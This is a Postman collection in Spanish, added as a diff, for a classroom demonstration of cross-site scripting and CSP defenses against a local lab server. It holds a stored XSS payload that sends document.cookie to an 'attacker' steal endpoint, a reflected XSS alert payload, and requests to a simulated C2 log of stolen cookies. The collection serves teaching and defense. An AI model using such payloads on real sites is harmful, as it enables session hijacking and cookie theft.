@@ -1,0 +1,223 @@
+{
+  "info": {
+    "_postman_id": "ciberseguridad-xss-demo",
+    "name": "Demostración XSS y CSP - Ciberseguridad Aplicada",
+    "description": "Colección completa para demostración en vivo de Cross-Site Scripting (XSS) y Políticas de Seguridad de Contenido (CSP) conforme a las Diapositivas 5 y 6.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "🔴 1. Escenarios Vulnerables (Stored & Reflected XSS)",
+      "item": [
+        {
+          "name": "1.1 [ATAQUE STORED XSS] Inyectar Payload Diapositiva 6 (Robo de Cookie)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"autor\": \"Erick Atacante\",\n  \"contenido\": \"<script>fetch('http://localhost:8081/api/attacker/steal?cookie=' + encodeURIComponent(document.cookie));</script>\"\n}"
+            },
+            "url": {
+              "raw": "http://localhost:8081/api/vulnerable/comentarios",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["api", "vulnerable", "comentarios"]
+            },
+            "description": "Inyecta el payload exacto de la Diapositiva 6. El servidor lo almacena en H2 sin sanitizar."
+          }
+        },
+        {
+          "name": "1.2 Consultar Comentarios Vulnerables (JSON sin sanitizar)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:8081/api/vulnerable/comentarios",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["api", "vulnerable", "comentarios"]
+            },
+            "description": "Retorna los comentarios tal como se guardaron, conteniendo las etiquetas script activas."
+          }
+        },
+        {
+          "name": "1.3 Cargar Muro HTML Vulnerable (Render directo en DOM)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:8081/vulnerable/muro-html",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["vulnerable", "muro-html"]
+            },
+            "description": "Retorna HTML donde los comentarios se concatenan sin escapar, provocando ejecución en el navegador."
+          }
+        },
+        {
+          "name": "1.4 [ATAQUE REFLECTED XSS] Búsqueda con parámetro reflejado",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:8081/api/vulnerable/buscar?q=<script>alert('XSS Reflejado')</script>",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["api", "vulnerable", "buscar"],
+              "query": [
+                { "key": "q", "value": "<script>alert('XSS Reflejado')</script>" }
+              ]
+            },
+            "description": "Refleja directamente el parámetro q sin validación en la respuesta HTML."
+          }
+        }
+      ]
+    },
+    {
+      "name": "🟢 2. Escenarios Mitigados (Defensas Diapositiva 6)",
+      "item": [
+        {
+          "name": "2.1 [DEFENSA 1] Enviar Comentario con Escape HTML (HtmlUtils)",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"autor\": \"Usuario Seguro\",\n  \"contenido\": \"<script>fetch('http://localhost:8081/api/attacker/steal?cookie=' + encodeURIComponent(document.cookie));</script>\"\n}"
+            },
+            "url": {
+              "raw": "http://localhost:8081/api/mitigado/comentarios",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["api", "mitigado", "comentarios"]
+            },
+            "description": "Aplica HtmlUtils.htmlEscape() neutralizando etiquetas HTML peligrosas."
+          }
+        },
+        {
+          "name": "2.2 Consultar Comentarios Mitigados (JSON Escapado)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:8081/api/mitigado/comentarios",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["api", "mitigado", "comentarios"]
+            },
+            "description": "Comprueba que el script se convirtió en &lt;script&gt; inofensivo."
+          }
+        },
+        {
+          "name": "2.3 Cargar Muro Protegido con Escape HTML",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:8081/mitigado/muro-escapado-html",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["mitigado", "muro-escapado-html"]
+            },
+            "description": "El navegador renderiza el script como texto literal plano sin ejecutar código."
+          }
+        },
+        {
+          "name": "2.4 [DEFENSA 2] Probar Muro con Cabecera CSP (Content Security Policy)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:8081/mitigado/muro-csp-html",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["mitigado", "muro-csp-html"]
+            },
+            "description": "Verifica en las cabeceras HTTP la presencia de Content-Security-Policy: default-src 'self'; script-src 'self';"
+          }
+        },
+        {
+          "name": "2.5 [DEFENSA 3] Generar Cookies de Prueba (HttpOnly vs Regular)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:8081/api/mitigado/generar-cookies",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["api", "mitigado", "generar-cookies"]
+            },
+            "description": "Verifica cabeceras Set-Cookie donde una incluye HttpOnly impidiendo su robo vía document.cookie."
+          }
+        }
+      ]
+    },
+    {
+      "name": "🕵️ 3. Servidor del Atacante (Listener C2)",
+      "item": [
+        {
+          "name": "3.1 Simular Recepción de Cookie Exfiltrada (Diapositiva 6)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:8081/api/attacker/steal?cookie=victima_secret_token_123456",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["api", "attacker", "steal"],
+              "query": [
+                { "key": "cookie", "value": "victima_secret_token_123456" }
+              ]
+            },
+            "description": "Endpoint invocado por el payload de la Diapositiva 6 al consumarse el ataque."
+          }
+        },
+        {
+          "name": "3.2 Consultar Historial de Cookies Robadas en el C2",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:8081/api/attacker/logs",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["api", "attacker", "logs"]
+            },
+            "description": "Obtiene la lista de credenciales y cookies secuestradas con IP y hora."
+          }
+        },
+        {
+          "name": "3.3 Limpiar Registros del Servidor del Atacante",
+          "request": {
+            "method": "DELETE",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:8081/api/attacker/logs",
+              "protocol": "http",
+              "host": ["localhost"],
+              "port": "8081",
+              "path": ["api", "attacker", "logs"]
+            },
+            "description": "Reinicia el estado del servidor del atacante para repetir la demostración."
+          }
+        }
+      ]
+    }
+  ]
+}
